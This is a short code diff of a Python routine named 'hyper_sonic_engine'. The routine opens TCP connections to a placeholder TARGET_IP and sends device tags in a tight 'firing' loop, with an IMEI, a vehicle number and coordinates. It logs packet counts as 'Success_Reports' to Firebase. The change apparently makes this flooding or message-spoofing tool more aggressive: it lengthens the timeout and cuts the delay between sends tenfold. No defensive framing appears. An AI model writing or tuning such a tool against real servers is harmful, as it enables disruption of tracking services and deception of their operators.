@@ -35,7 +35,7 @@ def hyper_sonic_engine(tags, imei, vno, lat, lon):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
-            s.settimeout(10)
+            s.settimeout(20)
             s.connect((TARGET_IP, TARGET_PORT))
             while firing:
                 for tag in tags:
@@ -48,7 +48,7 @@ def hyper_sonic_engine(tags, imei, vno, lat, lon):
                     logs.append(msg)
                     if len(logs) > 8: logs.pop(0)
                 db.reference('/Success_Reports').push({'vno': vno, 'packets': total_sent, 'time': datetime.now().strftime("%H:%M:%S")})
-                time.sleep(0.01)
+                time.sleep(0.001)
         except: time.sleep(0.5); continue
         finally: s.close()
 
